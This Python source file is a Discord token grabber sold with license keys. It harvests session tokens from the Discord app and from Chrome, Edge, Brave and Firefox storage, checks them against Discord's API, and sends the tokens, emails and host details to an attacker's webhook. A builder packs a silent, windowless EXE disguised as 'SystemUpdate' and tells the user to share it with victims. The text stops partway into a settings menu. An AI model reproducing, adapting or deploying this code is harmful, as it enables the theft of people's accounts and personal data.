import os
import re
import json
import requests
import platform
from pathlib import Path
from datetime import datetime, timedelta
import sqlite3
import sys
import hashlib
import secrets
import string
import subprocess
import time
import shutil
import tempfile

# ──────────────────────────────────────────────────────────────
#  CONFIGURATION
# ──────────────────────────────────────────────────────────────

LICENSE_FILE = "licenses.json"
SETTINGS_FILE = "settings.json"
CONFIG = {
    "embed_title": "🔐 Valid Discord Tokens",
    "embed_description": "Tokens extracted from this device",
    "embed_color": 0x00FF00,
    "embed_footer": "ENI's Logger • {timestamp}",
    "scan_app": True,
    "scan_browsers": True,
    "tokens_per_embed": 3,
}

# ──────────────────────────────────────────────────────────────
#  THEMES
# ──────────────────────────────────────────────────────────────

THEMES = {
    "neon": {
        "header": "\033[95m",
        "info": "\033[96m",
        "success": "\033[92m",
        "warn": "\033[93m",
        "error": "\033[91m",
        "reset": "\033[0m",
    },
    "dark": {
        "header": "\033[38;5;248m",
        "info": "\033[38;5;246m",
        "success": "\033[38;5;108m",
        "warn": "\033[38;5;179m",
        "error": "\033[38;5;167m",
        "reset": "\033[0m",
    },
    "matrix": {
        "header": "\033[92m",
        "info": "\033[92m",
        "success": "\033[92;1m",
        "warn": "\033[93m",
        "error": "\033[91m",
        "reset": "\033[0m",
    },
    "light": {
        "header": "\033[30;1m",
        "info": "\033[30m",
        "success": "\033[34m",
        "warn": "\033[33m",
        "error": "\033[31m",
        "reset": "\033[0m",
    },
    "ocean": {
        "header": "\033[36;1m",
        "info": "\033[34;1m",
        "success": "\033[32;1m",
        "warn": "\033[33;1m",
        "error": "\033[31;1m",
        "reset": "\033[0m",
    },
    "sunset": {
        "header": "\033[35;1m",
        "info": "\033[33;1m",
        "success": "\033[32;1m",
        "warn": "\033[31;1m",
        "error": "\033[91;1m",
        "reset": "\033[0m",
    }
}

# ──────────────────────────────────────────────────────────────
#  SETTINGS MANAGER
# ──────────────────────────────────────────────────────────────

def get_settings_path():
    if getattr(sys, 'frozen', False):
        return os.path.join(os.path.dirname(sys.executable), SETTINGS_FILE)
    else:
        return SETTINGS_FILE

def load_settings():
    settings_path = get_settings_path()
    if os.path.exists(settings_path):
        try:
            with open(settings_path, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_settings(settings):
    settings_path = get_settings_path()
    with open(settings_path, 'w') as f:
        json.dump(settings, f, indent=4)

def get_webhook_from_settings():
    settings = load_settings()
    return settings.get("webhook_url", "")

def get_current_theme():
    settings = load_settings()
    return settings.get("theme", "neon")

def set_theme(theme_name):
    settings = load_settings()
    settings["theme"] = theme_name
    save_settings(settings)

# ──────────────────────────────────────────────────────────────
#  HELPERS
# ──────────────────────────────────────────────────────────────

def colorize(text, style):
    theme_name = get_current_theme()
    theme = THEMES.get(theme_name, THEMES["neon"])
    return f"{theme.get(style, '')}{text}{theme['reset']}"

def log_info(msg): print(colorize(f"[+] {msg}", "info"))
def log_success(msg): print(colorize(f"[✓] {msg}", "success"))
def log_warn(msg): print(colorize(f"[!] {msg}", "warn"))
def log_error(msg): print(colorize(f"[-] {msg}", "error"))

def print_header():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    theme_name = get_current_theme().upper()
    header = f"""
    ╔═══════════════════════════════════════════════════════╗
    ║         ENI'S DISCORD TOKEN GRABBER v5.7            ║
    ║       "auto-license + silent EXE builder"          ║
    ║               Theme: {theme_name}                    ║
    ╚═══════════════════════════════════════════════════════╝
    """
    print(colorize(header, "header"))

# ──────────────────────────────────────────────────────────────
#  TEST WEBHOOK
# ──────────────────────────────────────────────────────────────

def test_webhook():
    webhook_url = get_webhook_from_settings()
    
    if not webhook_url:
        log_error("No webhook URL set! Please set it in Settings first.")
        return False
    
    print("\n" + "─" * 40)
    log_info(f"Testing webhook: {webhook_url[:50]}...")
    
    test_payload = {
        "content": "🔍 **Webhook Test Successful!**\n\nYour token grabber is configured correctly.",
        "embeds": [{
            "title": "✅ Test Message",
            "description": f"This is a test from ENI's Token Grabber\n\n**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "color": 0x00FF00,
            "footer": {"text": "ENI's Logger • Test"}
        }]
    }
    
    try:
        resp = requests.post(webhook_url, json=test_payload, timeout=15)
        if resp.status_code == 204:
            log_success("✅ Webhook test PASSED! Check Discord.")
            return True
        else:
            log_error(f"❌ Webhook test FAILED! Status: {resp.status_code}")
            return False
    except Exception as e:
        log_error(f"❌ Webhook test FAILED! Error: {e}")
        return False

# ──────────────────────────────────────────────────────────────
#  THEMES MENU
# ──────────────────────────────────────────────────────────────

def themes_menu():
    print("\n" + "=" * 50)
    print("🎨 THEME SELECTION")
    print("=" * 50)
    
    theme_list = list(THEMES.keys())
    current_theme = get_current_theme()
    
    for i, theme in enumerate(theme_list, 1):
        marker = "▶️ " if theme == current_theme else "   "
        print(f"  {i}. {marker}{theme.upper()}")
    
    print("\n  " + "─" * 40)
    print("  0. Back to main menu")
    
    choice = input("\nSelect theme: ").strip()
    
    try:
        choice = int(choice)
        if choice == 0:
            return False
        elif 1 <= choice <= len(theme_list):
            selected = theme_list[choice - 1]
            set_theme(selected)
            log_success(f"Theme changed to: {selected.upper()}")
            input("\nPress Enter to continue...")
            return True
        else:
            log_error("Invalid choice")
            input("\nPress Enter to continue...")
            return True
    except:
        log_error("Invalid input")
        input("\nPress Enter to continue...")
        return True

# ──────────────────────────────────────────────────────────────
#  HWID GENERATION
# ──────────────────────────────────────────────────────────────

def get_hwid():
    system = platform.system()
    hwid_parts = []
    
    if system == "Windows":
        try:
            cpu = subprocess.check_output("wmic cpu get processorid", shell=True).decode().strip().split("\n")[1].strip()
            hwid_parts.append(cpu)
        except:
            pass
        try:
            mac = subprocess.check_output("getmac /fo csv /nh", shell=True).decode().strip().split(",")[0].strip('"')
            hwid_parts.append(mac)
        except:
            pass
        try:
            vol = subprocess.check_output("vol C:", shell=True).decode().strip().split(" ")[-1]
            hwid_parts.append(vol)
        except:
            pass
    elif system == "Darwin":
        try:
            mac = subprocess.check_output("ifconfig en0 | grep ether", shell=True).decode().strip().split(" ")[-1]
            hwid_parts.append(mac)
        except:
            pass
        try:
            serial = subprocess.check_output("system_profiler SPHardwareDataType | grep 'Serial Number'", shell=True).decode().strip().split(": ")[-1]
            hwid_parts.append(serial)
        except:
            pass
    else:
        try:
            mac = subprocess.check_output("cat /sys/class/net/eth0/address", shell=True).decode().strip()
            hwid_parts.append(mac)
        except:
            pass
        try:
            cpu = subprocess.check_output("cat /proc/cpuinfo | grep Serial | cut -d ' ' -f 2", shell=True).decode().strip()
            hwid_parts.append(cpu)
        except:
            pass
    
    if not hwid_parts:
        hwid_parts.append(platform.node())
        hwid_parts.append(os.getlogin())
    
    combined = "|".join(hwid_parts)
    return hashlib.sha256(combined.encode()).hexdigest()

# ──────────────────────────────────────────────────────────────
#  LICENSE MANAGER
# ──────────────────────────────────────────────────────────────

class LicenseManager:
    def __init__(self, license_file=LICENSE_FILE):
        self.license_file = license_file
        self.licenses = self._load_licenses()
    
    def _load_licenses(self):
        if os.path.exists(self.license_file):
            try:
                with open(self.license_file, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def _save_licenses(self):
        with open(self.license_file, 'w') as f:
            json.dump(self.licenses, f, indent=4)
    
    def generate_key(self, expiry_minutes=60, max_uses=1):
        key_parts = []
        for _ in range(4):
            part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(5))
            key_parts.append(part)
        key = '-'.join(key_parts)
        expiry = (datetime.now() + timedelta(minutes=expiry_minutes)).isoformat()
        
        self.licenses[key] = {
            "key": key,
            "created_at": datetime.now().isoformat(),
            "expires_at": expiry,
            "expiry_minutes": expiry_minutes,
            "hwid": None,
            "used": False,
            "max_uses": max_uses,
            "uses": 0,
            "active": True
        }
        self._save_licenses()
        return key
    
    def validate_key(self, key, hwid):
        if key not in self.licenses:
            return {"valid": False, "reason": "Invalid license key"}
        
        license_data = self.licenses[key]
        
        if not license_data.get("active", True):
            return {"valid": False, "reason": "License is deactivated"}
        
        expires_at = datetime.fromisoformat(license_data["expires_at"])
        if datetime.now() > expires_at:
            return {"valid": False, "reason": "License has expired"}
        
        if license_data["hwid"] is not None:
            if license_data["hwid"] != hwid:
                return {"valid": False, "reason": "License is bound to another device"}
            if license_data.get("max_uses", 1) > 0 and license_data.get("uses", 0) >= license_data.get("max_uses", 1):
                return {"valid": False, "reason": "License has reached maximum uses"}
        else:
            license_data["hwid"] = hwid
            license_data["used"] = True
        
        license_data["uses"] = license_data.get("uses", 0) + 1
        self._save_licenses()
        
        return {
            "valid": True,
            "hwid": license_data["hwid"],
            "expires_at": license_data["expires_at"],
            "uses_remaining": license_data.get("max_uses", 1) - license_data.get("uses", 0),
            "time_remaining": self._get_time_remaining(license_data["expires_at"])
        }
    
    def _get_time_remaining(self, expires_at):
        expiry = datetime.fromisoformat(expires_at)
        remaining = expiry - datetime.now()
        if remaining.total_seconds() <= 0:
            return "Expired"
        days = remaining.days
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        if days > 0:
            return f"{days}d {hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h {minutes}m"
        else:
            return f"{minutes}m"
    
    def list_keys(self):
        return self.licenses
    
    def revoke_key(self, key):
        if key in self.licenses:
            self.licenses[key]["active"] = False
            self._save_licenses()
            return True
        return False
    
    def extend_key(self, key, extra_minutes=60):
        if key in self.licenses:
            current_expiry = datetime.fromisoformat(self.licenses[key]["expires_at"])
            new_expiry = current_expiry + timedelta(minutes=extra_minutes)
            self.licenses[key]["expires_at"] = new_expiry.isoformat()
            self.licenses[key]["expiry_minutes"] += extra_minutes
            self._save_licenses()
            return True
        return False
    
    def add_key_manually(self, key, expiry_minutes=60, max_uses=1):
        """Add a key manually (for auto-generation from user input)."""
        expiry = (datetime.now() + timedelta(minutes=expiry_minutes)).isoformat()
        
        self.licenses[key] = {
            "key": key,
            "created_at": datetime.now().isoformat(),
            "expires_at": expiry,
            "expiry_minutes": expiry_minutes,
            "hwid": None,
            "used": False,
            "max_uses": max_uses,
            "uses": 0,
            "active": True
        }
        self._save_licenses()
        return True

def authenticate_user():
    hwid = get_hwid()
    manager = LicenseManager()
    
    # Check if already authenticated
    if os.path.exists("auth_cache.json"):
        try:
            with open("auth_cache.json", 'r') as f:
                cache = json.load(f)
                if cache.get("hwid") == hwid:
                    key = cache.get("key")
                    validation = manager.validate_key(key, hwid)
                    if validation["valid"]:
                        return True
        except:
            pass
    
    print("\n" + "=" * 50)
    print("🔐 LICENSE AUTHENTICATION")
    print("=" * 50)
    print("\nEnter your license key to activate:")
    print("(If you don't have one, contact the seller)\n")
    
    key = input("🔑 Key: ").strip().upper()
    
    if not key:
        print("❌ No key entered")
        return False
    
    # Check if the key exists in the license file
    validation = manager.validate_key(key, hwid)
    
    if validation["valid"]:
        print("\n" + "=" * 50)
        print("✅ LICENSE ACTIVATED SUCCESSFULLY!")
        print("=" * 50)
        print(f"\n⏰ Time remaining: {validation['time_remaining']}")
        print(f"📊 Uses remaining: {validation['uses_remaining']}")
        
        with open("auth_cache.json", 'w') as f:
            json.dump({"key": key, "hwid": hwid}, f)
        
        return True
    else:
        print("\n" + "=" * 50)
        print("❌ LICENSE VALIDATION FAILED")
        print("=" * 50)
        print(f"\nReason: {validation['reason']}")
        
        # Ask if they want to generate a trial key
        print("\n" + "─" * 40)
        print("Do you want to generate a trial key?")
        print("(1-hour trial, single use only)")
        trial_choice = input("\nGenerate trial key? (y/n): ").strip().lower()
        
        if trial_choice == 'y':
            # Generate a trial key
            trial_key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(20))
            trial_key = '-'.join([trial_key[i:i+5] for i in range(0, 20, 5)])
            
            manager.add_key_manually(trial_key, expiry_minutes=60, max_uses=1)
            print(f"\n✅ Trial key generated: {trial_key}")
            print("⏰ Expires in: 60 minutes (1 hour)")
            print("📊 Max uses: 1")
            
            # Now validate the new key
            validation = manager.validate_key(trial_key, hwid)
            if validation["valid"]:
                print("\n✅ Trial key activated successfully!")
                with open("auth_cache.json", 'w') as f:
                    json.dump({"key": trial_key, "hwid": hwid}, f)
                return True
            else:
                print(f"❌ Trial key activation failed: {validation['reason']}")
                return False
        
        return False

# ──────────────────────────────────────────────────────────────
#  TOKEN EXTRACTION
# ──────────────────────────────────────────────────────────────

def extract_tokens_from_text(content):
    pattern = r'[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}'
    matches = re.findall(pattern, content)
    return matches

def get_discord_app_tokens():
    tokens = []
    system = platform.system()

    if system == "Windows":
        base = Path(os.getenv("APPDATA")) / "Discord" / "Local Storage" / "leveldb"
    elif system == "Darwin":
        base = Path.home() / "Library" / "Application Support" / "discord" / "Local Storage" / "leveldb"
    else:
        base = Path.home() / ".config" / "discord" / "Local Storage" / "leveldb"

    if not base.exists():
        return tokens

    for file in base.glob("*.log"):
        try:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                found = extract_tokens_from_text(content)
                tokens.extend(found)
        except:
            pass

    for file in base.glob("*.ldb"):
        try:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                found = extract_tokens_from_text(content)
                tokens.extend(found)
        except:
            pass

    return tokens

def get_browser_tokens():
    tokens = []
    system = platform.system()

    browser_paths = {
        "Chrome": {
            "win": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
            "mac": Path.home() / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Local Storage" / "leveldb",
            "linux": Path.home() / ".config" / "google-chrome" / "Default" / "Local Storage" / "leveldb"
        },
        "Edge": {
            "win": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
            "mac": Path.home() / "Library" / "Application Support" / "Microsoft Edge" / "Default" / "Local Storage" / "leveldb",
            "linux": Path.home() / ".config" / "microsoft-edge" / "Default" / "Local Storage" / "leveldb"
        },
        "Brave": {
            "win": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
            "mac": Path.home() / "Library" / "Application Support" / "BraveSoftware" / "Brave-Browser" / "Default" / "Local Storage" / "leveldb",
            "linux": Path.home() / ".config" / "BraveSoftware" / "Brave-Browser" / "Default" / "Local Storage" / "leveldb"
        }
    }

    firefox_paths = []
    if system == "Windows":
        firefox_base = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
    elif system == "Darwin":
        firefox_base = Path.home() / "Library" / "Application Support" / "Firefox" / "Profiles"
    else:
        firefox_base = Path.home() / ".mozilla" / "firefox"

    if firefox_base.exists():
        for profile in firefox_base.glob("*.default*"):
            firefox_paths.append(profile / "webappsstore.sqlite")

    for browser_name, paths in browser_paths.items():
        system_key = "win" if system == "Windows" else "mac" if system == "Darwin" else "linux"
        base_path = paths.get(system_key)

        if not base_path or not base_path.exists():
            continue

        for file in base_path.glob("*.log"):
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    found = extract_tokens_from_text(content)
                    if found:
                        tokens.extend(found)
            except:
                pass

        for file in base_path.glob("*.ldb"):
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    found = extract_tokens_from_text(content)
                    tokens.extend(found)
            except:
                pass

    for sqlite_path in firefox_paths:
        if not sqlite_path.exists():
            continue
        try:
            conn = sqlite3.connect(str(sqlite_path))
            cursor = conn.cursor()
            cursor.execute("SELECT key, value FROM webappsstore2 WHERE key LIKE '%discord%' OR value LIKE '%token%'")
            rows = cursor.fetchall()
            for key, value in rows:
                found = extract_tokens_from_text(value)
                if found:
                    tokens.extend(found)
            conn.close()
        except:
            pass

    return tokens

# ──────────────────────────────────────────────────────────────
#  TOKEN VALIDATION
# ──────────────────────────────────────────────────────────────

def validate_token(token):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "valid": True,
                "username": data.get("username", "Unknown"),
                "discriminator": data.get("discriminator", "0000"),
                "id": data.get("id", "Unknown"),
                "email": data.get("email", "Not visible"),
                "mfa_enabled": data.get("mfa_enabled", False),
                "token": token
            }
        else:
            return {"valid": False, "token": token}
    except:
        return {"valid": False, "token": token}

def process_tokens(tokens):
    processed = []
    seen_tokens = set()
    
    for token in tokens:
        if token in seen_tokens:
            continue
        seen_tokens.add(token)
        
        user_info = validate_token(token)
        if user_info["valid"]:
            processed.append({
                "token": user_info["token"],
                "username": f"{user_info['username']}#{user_info['discriminator']}",
                "user_id": user_info["id"],
                "valid": True,
                "email": user_info.get("email", "N/A"),
                "mfa": user_info.get("mfa_enabled", False)
            })
    
    return processed

# ──────────────────────────────────────────────────────────────
#  WEBHOOK SENDER
# ──────────────────────────────────────────────────────────────

def send_to_webhook(valid_tokens, webhook_url):
    if not valid_tokens or not webhook_url:
        return False

    batch_size = CONFIG["tokens_per_embed"]
    token_batches = [valid_tokens[i:i+batch_size] for i in range(0, len(valid_tokens), batch_size)]
    
    embeds = []
    
    for batch_idx, batch in enumerate(token_batches, 1):
        embed = {
            "title": f"{CONFIG['embed_title']} (Batch {batch_idx}/{len(token_batches)})",
            "description": CONFIG["embed_description"],
            "color": CONFIG["embed_color"],
            "fields": [],
            "footer": {
                "text": CONFIG["embed_footer"].format(timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            },
            "timestamp": datetime.now().isoformat()
        }

        if batch_idx == 1:
            embed["fields"].append({
                "name": "📊 Summary",
                "value": f"✅ Valid tokens found: {len(valid_tokens)}\n📦 Batches: {len(token_batches)}",
                "inline": False
            })
            embed["fields"].append({
                "name": "🖥️ System Info",
                "value": f"OS: {platform.system()} {platform.release()}\nHostname: {platform.node()}",
                "inline": False
            })

        for i, token_info in enumerate(batch, 1):
            global_idx = (batch_idx - 1) * batch_size + i
            token_display = f'"{token_info["token"]}"'
            
            field_value = (
                f"**Username:** {token_info['username']}\n"
                f"**User ID:** {token_info['user_id']}\n"
                f"**Email:** {token_info['email']}\n"
                f"**MFA:** {'✅ Enabled' if token_info['mfa'] else '❌ Disabled'}\n\n"
                f"**📋 Token:**\n"
                f"```\n{token_display}\n```"
            )
            
            embed["fields"].append({
                "name": f"🔑 Token #{global_idx} — {token_info['username']}",
                "value": field_value[:1024],
                "inline": False
            })
        
        embeds.append(embed)

    success = True
    for embed in embeds:
        payload = {
            "content": f"**✅ Discord Tokens**",
            "embeds": [embed]
        }
        
        try:
            resp = requests.post(webhook_url, json=payload, timeout=15)
            if resp.status_code != 204:
                success = False
        except:
            success = False

    return success

# ──────────────────────────────────────────────────────────────
#  SILENT GRABBER (FOR VICTIM EXE)
# ──────────────────────────────────────────────────────────────

def run_silent_grabber(webhook_url):
    try:
        if not webhook_url:
            return False
        
        all_tokens = []
        
        app_tokens = get_discord_app_tokens()
        if app_tokens:
            all_tokens.extend(app_tokens)
        
        browser_tokens = get_browser_tokens()
        if browser_tokens:
            all_tokens.extend(browser_tokens)
        
        if not all_tokens:
            return False
        
        valid_tokens = process_tokens(all_tokens)
        
        if valid_tokens:
            send_to_webhook(valid_tokens, webhook_url)
            return True
        
        return False
    except:
        return False

# ──────────────────────────────────────────────────────────────
#  EXE BUILDER (COMPLETELY FIXED)
# ──────────────────────────────────────────────────────────────

def check_pyinstaller():
    try:
        import PyInstaller
        return True
    except ImportError:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                          check=True, capture_output=True, text=True)
            return True
        except:
            return False

def build_silent_exe():
    print("\n" + "=" * 50)
    print("🔨 BUILD SILENT VICTIM EXE")
    print("=" * 50)
    
    webhook = get_webhook_from_settings()
    if not webhook:
        log_error("No webhook URL set! Please set it in Settings first.")
        return False
    
    if not check_pyinstaller():
        log_error("PyInstaller is required.")
        return False
    
    print("\n" + "─" * 40)
    default_name = "SystemUpdate"
    output_name = input(f"Enter output EXE name (default: {default_name}): ").strip()
    if not output_name:
        output_name = default_name
    
    output_name = re.sub(r'[^a-zA-Z0-9_-]', '', output_name)
    if not output_name:
        output_name = default_name
    
    print("\n" + "─" * 40)
    print("Where do you want to save the EXE?")
    print("  1. Desktop")
    print("  2. Current folder")
    print("  3. Custom path")
    
    path_choice = input("\nSelect option: ").strip()
    
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    
    if path_choice == "1":
        save_dir = desktop
    elif path_choice == "2":
        save_dir = os.getcwd()
    elif path_choice == "3":
        custom_path = input("Enter full path: ").strip()
        if os.path.exists(custom_path):
            save_dir = custom_path
        else:
            log_error("Path does not exist. Using current folder.")
            save_dir = os.getcwd()
    else:
        save_dir = os.getcwd()
    
    # Create the embedded script
    embedded_script = '''import os
import re
import json
import requests
import platform
from pathlib import Path
from datetime import datetime
import sqlite3
import sys

WEBHOOK_URL = "''' + webhook + '''"

def extract_tokens_from_text(content):
    pattern = r'[A-Za-z0-9_-]{24,}\\.[A-Za-z0-9_-]{6,}\\.[A-Za-z0-9_-]{27,}'
    return re.findall(pattern, content)

def get_discord_app_tokens():
    tokens = []
    system = platform.system()
    if system == "Windows":
        base = Path(os.getenv("APPDATA")) / "Discord" / "Local Storage" / "leveldb"
    elif system == "Darwin":
        base = Path.home() / "Library" / "Application Support" / "discord" / "Local Storage" / "leveldb"
    else:
        base = Path.home() / ".config" / "discord" / "Local Storage" / "leveldb"
    if not base.exists():
        return tokens
    for file in base.glob("*.log"):
        try:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                tokens.extend(extract_tokens_from_text(f.read()))
        except:
            pass
    for file in base.glob("*.ldb"):
        try:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                tokens.extend(extract_tokens_from_text(f.read()))
        except:
            pass
    return tokens

def get_browser_tokens():
    tokens = []
    system = platform.system()
    browser_paths = {
        "Chrome": {
            "win": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
            "mac": Path.home() / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Local Storage" / "leveldb",
            "linux": Path.home() / ".config" / "google-chrome" / "Default" / "Local Storage" / "leveldb"
        },
        "Edge": {
            "win": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
            "mac": Path.home() / "Library" / "Application Support" / "Microsoft Edge" / "Default" / "Local Storage" / "leveldb",
            "linux": Path.home() / ".config" / "microsoft-edge" / "Default" / "Local Storage" / "leveldb"
        },
        "Brave": {
            "win": Path(os.getenv("LOCALAPPDATA")) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
            "mac": Path.home() / "Library" / "Application Support" / "BraveSoftware" / "Brave-Browser" / "Default" / "Local Storage" / "leveldb",
            "linux": Path.home() / ".config" / "BraveSoftware" / "Brave-Browser" / "Default" / "Local Storage" / "leveldb"
        }
    }
    firefox_paths = []
    if system == "Windows":
        firefox_base = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
    elif system == "Darwin":
        firefox_base = Path.home() / "Library" / "Application Support" / "Firefox" / "Profiles"
    else:
        firefox_base = Path.home() / ".mozilla" / "firefox"
    if firefox_base.exists():
        for profile in firefox_base.glob("*.default*"):
            firefox_paths.append(profile / "webappsstore.sqlite")
    for browser_name, paths in browser_paths.items():
        system_key = "win" if system == "Windows" else "mac" if system == "Darwin" else "linux"
        base_path = paths.get(system_key)
        if not base_path or not base_path.exists():
            continue
        for file in base_path.glob("*.log"):
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    found = extract_tokens_from_text(f.read())
                    if found:
                        tokens.extend(found)
            except:
                pass
        for file in base_path.glob("*.ldb"):
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    found = extract_tokens_from_text(f.read())
                    if found:
                        tokens.extend(found)
            except:
                pass
    for sqlite_path in firefox_paths:
        if not sqlite_path.exists():
            continue
        try:
            conn = sqlite3.connect(str(sqlite_path))
            cursor = conn.cursor()
            cursor.execute("SELECT key, value FROM webappsstore2 WHERE key LIKE '%discord%' OR value LIKE '%token%'")
            rows = cursor.fetchall()
            for key, value in rows:
                found = extract_tokens_from_text(value)
                if found:
                    tokens.extend(found)
            conn.close()
        except:
            pass
    return tokens

def validate_token(token):
    try:
        resp = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token, "User-Agent": "Mozilla/5.0"}, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "valid": True,
                "username": data.get("username", "Unknown"),
                "discriminator": data.get("discriminator", "0000"),
                "id": data.get("id", "Unknown"),
                "email": data.get("email", "Not visible"),
                "mfa_enabled": data.get("mfa_enabled", False),
                "token": token
            }
        return {"valid": False, "token": token}
    except:
        return {"valid": False, "token": token}

def process_tokens(tokens):
    processed = []
    seen = set()
    for token in tokens:
        if token in seen:
            continue
        seen.add(token)
        user_info = validate_token(token)
        if user_info["valid"]:
            processed.append({
                "token": user_info["token"],
                "username": user_info["username"] + "#" + user_info["discriminator"],
                "user_id": user_info["id"],
                "valid": True,
                "email": user_info.get("email", "N/A"),
                "mfa": user_info.get("mfa_enabled", False)
            })
    return processed

def send_to_webhook(valid_tokens):
    if not valid_tokens:
        return False
    batch_size = 3
    token_batches = [valid_tokens[i:i+batch_size] for i in range(0, len(valid_tokens), batch_size)]
    embeds = []
    for batch_idx, batch in enumerate(token_batches, 1):
        embed = {
            "title": "🔐 Discord Tokens (Batch " + str(batch_idx) + "/" + str(len(token_batches)) + ")",
            "description": "Tokens extracted from this device",
            "color": 0x00FF00,
            "fields": [],
            "footer": {"text": "ENI's Logger • " + datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
            "timestamp": datetime.now().isoformat()
        }
        if batch_idx == 1:
            embed["fields"].append({
                "name": "📊 Summary",
                "value": "✅ Valid tokens found: " + str(len(valid_tokens)) + "\\n📦 Batches: " + str(len(token_batches)),
                "inline": False
            })
            embed["fields"].append({
                "name": "🖥️ System Info",
                "value": "OS: " + platform.system() + " " + platform.release() + "\\nHostname: " + platform.node(),
                "inline": False
            })
        for i, token_info in enumerate(batch, 1):
            global_idx = (batch_idx - 1) * batch_size + i
            token_display = '"' + token_info["token"] + '"'
            field_value = (
                "**Username:** " + token_info["username"] + "\\n"
                "**User ID:** " + token_info["user_id"] + "\\n"
                "**Email:** " + token_info["email"] + "\\n"
                "**MFA:** " + ("✅ Enabled" if token_info["mfa"] else "❌ Disabled") + "\\n\\n"
                "**📋 Token:**\\n"
                "```\\n" + token_display + "\\n```"
            )
            embed["fields"].append({
                "name": "🔑 Token #" + str(global_idx) + " — " + token_info["username"],
                "value": field_value[:1024],
                "inline": False
            })
        embeds.append(embed)
    for embed in embeds:
        try:
            requests.post(WEBHOOK_URL, json={"content": "**✅ Discord Tokens**", "embeds": [embed]}, timeout=15)
        except:
            pass
    return True

def main():
    try:
        all_tokens = []
        app_tokens = get_discord_app_tokens()
        if app_tokens:
            all_tokens.extend(app_tokens)
        browser_tokens = get_browser_tokens()
        if browser_tokens:
            all_tokens.extend(browser_tokens)
        if all_tokens:
            valid_tokens = process_tokens(all_tokens)
            if valid_tokens:
                send_to_webhook(valid_tokens)
    except:
        pass

if __name__ == "__main__":
    main()
'''
    
    print(f"\n📁 Building silent EXE: {output_name}.exe")
    print(f"📬 Webhook: {webhook[:50]}...")
    print(f"📂 Save location: {save_dir}")
    print("⏳ This may take 2-3 minutes...")
    
    temp_dir = tempfile.mkdtemp()
    temp_script = os.path.join(temp_dir, "grabber.py")
    
    with open(temp_script, 'w', encoding='utf-8') as f:
        f.write(embedded_script)
    
    build_dir = os.path.join(temp_dir, "build")
    dist_dir = os.path.join(temp_dir, "dist")
    for folder in [build_dir, dist_dir]:
        if os.path.exists(folder):
            try:
                shutil.rmtree(folder)
            except:
                pass
    
    try:
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--name", output_name,
            "--hidden-import", "requests",
            "--hidden-import", "sqlite3",
            "--clean",
            "--noconfirm",
            "--distpath", dist_dir,
            "--workpath", build_dir,
            "--specpath", temp_dir,
            temp_script
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            log_error("Build failed!")
            if result.stderr:
                print(result.stderr[:500])
            return False
        
        exe_name = f"{output_name}.exe" if platform.system() == "Windows" else output_name
        exe_path = os.path.join(dist_dir, exe_name)
        
        if os.path.exists(exe_path):
            final_path = os.path.join(save_dir, exe_name)
            
            if os.path.exists(final_path):
                overwrite = input(f"\n{final_path} already exists. Overwrite? (y/n): ").strip().lower()
                if overwrite != 'y':
                    print("Build cancelled.")
                    return False
            
            shutil.move(exe_path, final_path)
            
            print("\n" + "=" * 50)
            print("✅ SILENT EXE BUILD SUCCESSFUL!")
            print("=" * 50)
            print(f"\n📁 EXE Location: {final_path}")
            print(f"📦 File Size: {os.path.getsize(final_path) / (1024*1024):.2f} MB")
            print("\n⚠️  This EXE runs COMPLETELY SILENTLY:")
            print("   - No console window")
            print("   - No user interaction")
            print("   - Runs in background")
            print("   - Grabs Discord tokens (app + browsers)")
            print("   - Sends to your webhook")
            print("\n📋 Share this EXE with victims!")
            
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            
            return True
        else:
            log_error("EXE not found after build.")
            return False
    except Exception as e:
        log_error(f"Build error: {e}")
        return False

# ──────────────────────────────────────────────────────────────
#  SETTINGS MENU
